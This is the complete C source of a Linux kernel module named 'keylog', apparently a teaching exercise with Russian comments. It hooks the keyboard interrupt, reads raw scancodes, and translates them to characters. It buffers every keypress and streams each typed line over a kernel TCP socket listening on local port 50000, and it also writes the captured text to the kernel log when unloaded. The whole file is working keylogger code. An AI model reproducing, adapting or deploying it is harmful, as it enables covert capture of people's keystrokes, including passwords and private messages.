#include <linux/module.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/ioport.h>
#include <asm/io.h>
#include <linux/spinlock.h>
#include <linux/workqueue.h>
#include <linux/slab.h>
#include <net/sock.h>
#include <linux/in.h>
#include <linux/net.h>

#define MODULE_NAME "keylog"

#define I8042_K_IRQ 1

#define I8042_DATA_REG 0x60
#define I8042_STATUS_REG 0x64

#define RELEASED_MASK 0x80

#define BUFFER_SIZE 1024

#define MY_TCP_PORT 50000
#define LISTEN_BACKLOG 5

struct keylog_data {
	char buf[BUFFER_SIZE];		// кольцевой буфер
	size_t put_idx, get_idx, count; // индексы
	spinlock_t lock;		// переменная блокировка
	struct work_struct workq;	// структура задания
} k_data;

struct acc_socket {
	spinlock_t lock;	
	struct work_struct workq;
} s_data;


static int irq = I8042_K_IRQ, irq_counter = 0;

static struct socket *sock = NULL; 	// прослушивающий (серверный) сокет
static struct socket *new_sock = NULL; 	// сокет для принятого соединения

static void cycbuf_put_char(struct keylog_data *kdata, char c) {
	if (kdata->count >= BUFFER_SIZE)
		return;

	kdata->buf[kdata->put_idx] = c;
	kdata->put_idx = (kdata->put_idx + 1) % BUFFER_SIZE;
	kdata->count++;
}

static bool cycbuf_get_char(char *c, struct keylog_data *kdata) {
	if (kdata->count > 0) {
		*c = kdata->buf[kdata->get_idx];
		kdata->get_idx = (kdata->get_idx + 1) % BUFFER_SIZE;
		kdata->count--;
		return true;
	}
	return false;
}

static int cycbuf_get_size(struct keylog_data *kdata) {
	return kdata->count;
}

static int cycbuf_get_str(char *str, struct keylog_data *kdata) {
	char ch;
	int i = 0;
	while (cycbuf_get_char(&ch, kdata)) {
		*(str+i)=ch;
		i++;
	}
	str[i]=0;
	return i;
}

static void cycbuf_reset_buffer(struct keylog_data *kdata) {
	kdata->count = 0;
	kdata->put_idx = 0;
	kdata->get_idx = 0;
}

static u8 i8042_read_data(void) {
	u8 val;
	val = inb(I8042_DATA_REG);
	return val;       
}

static int is_key_pressed(u8 scancode) {
	return !(scancode & RELEASED_MASK);
}

static int scancode2ascii(u8 scancode) {
	static char *row1 = "1234567890";
	static char *row2 = "qwertyuiop";
	static char *row3 = "asdfghjkl";
	static char *row4 = "zxcvbnm";

	scancode &= ~RELEASED_MASK;
	if (scancode >= 0x02 && scancode <= 0x0b)
		return *(row1 + scancode - 0x02);
	if (scancode >= 0x10 && scancode <= 0x19)
		return *(row2 + scancode - 0x10);
	if (scancode >= 0x1e && scancode <= 0x26)
		return *(row3 + scancode - 0x1e);
	if (scancode >= 0x2c && scancode <= 0x32)
		return *(row4 + scancode - 0x2c);
	if (scancode == 0x39)	return ' ';
	if (scancode == 0x1c)	return '\n';
	if (scancode == 12)	return '-';
	if (scancode == 53)	return '/';
	if (scancode == 52)	return '.';
	return '?';
}

static int my_tcp_msgsend(struct socket *s, char *message) {
	struct msghdr msg;
	struct kvec iov;
	int len = strlen(message) + 1;
	iov.iov_base = message;
	iov.iov_len = len;
	memset(&msg, 0, sizeof(msg));
	return kernel_sendmsg(s, &msg, &iov, 1, len);
}

static void flush_data( struct work_struct *work ) {
	unsigned long flags;
	if (new_sock == NULL) {
		printk (KERN_INFO "08.6 - In Workqueue. No socket.\n");
		return;
	}
	struct keylog_data *kdata = container_of(work, struct keylog_data, workq);
	printk (KERN_INFO "08.6 - In Workqueue. Flushing\n");
	char *buffer = kmalloc(cycbuf_get_size(kdata)+1,GFP_KERNEL);
	// Включаем блокировку
	spin_lock_irqsave(&kdata->lock,flags);
	int len = cycbuf_get_str((char*)buffer,kdata);
	spin_unlock_irqrestore(&kdata->lock,flags); // выходим из секции
	if ((new_sock != NULL) && (len > 0)) {
		spin_lock(&s_data.lock);	
		my_tcp_msgsend(new_sock,buffer);
		spin_unlock(&s_data.lock);
	}
	kfree(buffer);
	return;
}

static irqreturn_t my_interrupt( int irq, void *dev_id ) {
	u8 scancode = 0;
	int pressed, ch;
	irq_counter++;
	struct keylog_data *kdata = (struct keylog_data *)dev_id;
	scancode = i8042_read_data();
	ch = scancode2ascii(scancode);
	if ((pressed=is_key_pressed(scancode))) {
		// Включаем блокировку
		spin_lock(&kdata->lock);
		cycbuf_put_char(kdata, ch); // критическая секция
		spin_unlock(&kdata->lock); // выходим из секции
	} else {
		if ( ch == '\n' ) {
			printk (KERN_INFO "08.6 - Got new line. Sheduling flush workqueue\n");
			schedule_work(&kdata->workq);
		}
	}
	return IRQ_NONE; 
}

static int listen_sock_create(void) {
	struct sockaddr_in addr = {  // прослушиваемый адрес
		.sin_family	= AF_INET,
		.sin_port	= htons(MY_TCP_PORT),
		.sin_addr	= { htonl(INADDR_LOOPBACK) }
	};
	int addrlen = sizeof(addr);
	sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
	sock->ops->bind(sock, (struct sockaddr *) &addr, addrlen);
	sock->ops->listen(sock, LISTEN_BACKLOG);
	printk(KERN_INFO "08.6 - Listening on socket.\n");
	return 0;
}

static void accepting_sock_create(struct work_struct *work) {
	spin_lock(&s_data.lock);
	sock_create_lite(PF_INET, SOCK_STREAM, IPPROTO_TCP, &new_sock);
	new_sock->ops = sock->ops;
	sock->ops->accept(sock,new_sock, 0, true);
	spin_unlock(&s_data.lock);
	printk(KERN_INFO "08.6 - Accepting connection on socket.\n");
	return;
}

static int __init my_init( void ) {
	unsigned long flags;
        spin_lock_init(&k_data.lock);			// Инициализация спин-блокировки
        spin_lock_irqsave(&k_data.lock,flags);		// Старт блокировки
        cycbuf_reset_buffer(&k_data);  			// Критическая секция
        spin_unlock_irqrestore(&k_data.lock,flags);	// Разблокировка
	if ( request_irq( irq, my_interrupt, IRQF_SHARED, "my_interrupt", &k_data ) )
		return -1;
	printk( KERN_INFO "08.6 - Successfully loading ISR handler on IRQ %d\n", irq );
	INIT_WORK( &k_data.workq, flush_data );
	INIT_WORK( &s_data.workq, accepting_sock_create);
	listen_sock_create();
	spin_lock_init(&s_data.lock);
	schedule_work(&s_data.workq);
	return 0;
}

static void __exit my_exit( void ) {
	unsigned long flags;
	char *buffer;
	synchronize_irq( irq );
	free_irq( irq, &k_data );
	printk( KERN_INFO "08.6 - Successfully unloading, irq_counter = %d\n", irq_counter );
	flush_scheduled_work();
	buffer = kmalloc(cycbuf_get_size(&k_data)+1,GFP_KERNEL);
	spin_lock_irqsave(&k_data.lock,flags); 		// Начало критической секции
	int len = cycbuf_get_str((char*)buffer,&k_data);
	printk (KERN_INFO "08.6 - Buffer: [%d] %s\n",len,buffer);
	spin_unlock_irqrestore(&k_data.lock,flags);
	kfree(buffer);
	sock_release(new_sock);
	sock_release(sock);
}
module_init( my_init );
module_exit( my_exit );
MODULE_LICENSE( "GPL v2" );
